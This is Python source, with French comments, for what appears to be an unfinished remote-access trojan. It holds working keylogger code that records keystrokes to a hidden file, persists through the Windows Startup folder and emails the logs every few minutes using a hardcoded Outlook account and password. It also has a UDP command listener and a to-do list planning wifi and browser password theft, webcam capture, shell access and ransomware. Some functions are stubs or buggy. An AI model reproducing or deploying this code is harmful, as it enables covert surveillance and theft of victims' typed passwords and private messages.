from threading import Thread
from os import SEEK_END, getlogin
import importlib
import socket
import keyboard
from subprocess import check_output
import smtplib
import datetime
import time
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders



##############################################################################################

# reste a faire : camera + extraction mdp wifi / dans le navigateur(ou cookie de connection) #
#  + géoloc + shell_exec maybe ransoware si besoin et si temps diviser le prog en fonction   #

##############################################################################################

#############################################################################

#         fonction used to copy the file into the startup directory         #

#############################################################################

def write_in_startup(filename, file_content):
    """
    fonction permettant d'écrire en créant un nouveau fichier dans le dossier startup
    prend deux arguements, le nom du fichier et son contenu
    """
    username = getlogin()
    path_to_startup = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}"  
    file = open(path_to_startup,"w")
    file.write(file_content)


#############################################################################

#                   fonctions to send and create log file                   #

#############################################################################


def send_file_mail(file="./log.txt"):
    """
    fonction permettant d'envoyer un fichier par mail 
    """
    while keylogger_running:    
        email = "sending.address420@hotmail.com"
        message = MIMEMultipart()
        message["From"] = email                   # sender email address
        message['To'] = email                     # receiving email address 
        message['Subject'] = f"keylogger file of {str(datetime.datetime.now())[:22]}" # mail subject
        attachment = open(file,'rb')              # reading into file
        obj = MIMEBase('application', 'octet-stream') # content type header 
        obj.set_payload((attachment).read())      # set attachment to the email
        encoders.encode_base64(obj)               # base64 encode the attachment 
        obj.add_header('Content-Disposition',f"attachment; filename={file}")  # add header 
        message.attach(obj)                       
        my_message = message.as_string()
        email_session = smtplib.SMTP('smtp.outlook.com',587)
        email_session.starttls()
        email_session.login(email,'havefuninlife<3')
        email_session.sendmail(email, email,my_message)
        email_session.quit()
        time.sleep(180)



def create_log_file():
    
    log = open("./log.txt", "a+") # open the file in appending mode or create it if not existing 
    check_output("attrib +h ./log.txt")  # hide the file 
    
def erase_last_caracter(filepath):
    with open(filepath, 'rb+') as filehandle:
        filehandle.seek(-1, SEEK_END)
        filehandle.truncate()

 
#############################################################################

#              fonctions related to the keylogger fonctionnement            #

#############################################################################

# # #          keylogger fonctions           # # #

def on_press(key):
    if keylogger_running:    
        global log
        if key == Key.space:
            log.write(" ")
        elif key == Key.backspace:
            erase_last_caracter(log)
        elif key == Key.tab:
            log.write("    ")
        elif key == Key.enter:
            log.write("\n\r ")
        else:
            log.write(str(key)[1])
    else:
        return False

def on_release(key):
    if key == Key.esc:
        pass

def keylogger():
    """ 
    fonction dans laquelle on gèrera tout ce qui est en lien avec le keylogger 
    et qui aura son propre thread
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# # #           thread fonctions         # # # 

def start_keylogger():
    global keylogger_running
    keylogger_running = True
    keylogger_thread = Thread(target=keylogger, daemon=True)
    create_log_file()
    mail_thread = Thread(target=send_file_mail, daemon=True)
    keylogger_thread.start()
    mail_thread.start()

def stop_keylogger():
    keylogger_running = False
    

#############################################################################

#             fonction related to connection and data handeling             #

#############################################################################


def connect_to(ip="172.20.69.153", port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:    
        data, addr = server.recvfrom(4096)
        handle_received_data(data)
    
def handle_received_data(data):
    if data == "keylogger_start":
        start_keylogger()
        return 0
    if data == "keylogger_stop":
        stop_keylogger
    
#############################################################################

#                        WIFI PASSWORD EXTRACTION                           #

#############################################################################

def extract_wifi_password():
    pass

#############################################################################

#                               MAIN FONCTION                               #

#############################################################################



def main():
    pass    
    
if __name__ == '__main__':
    main()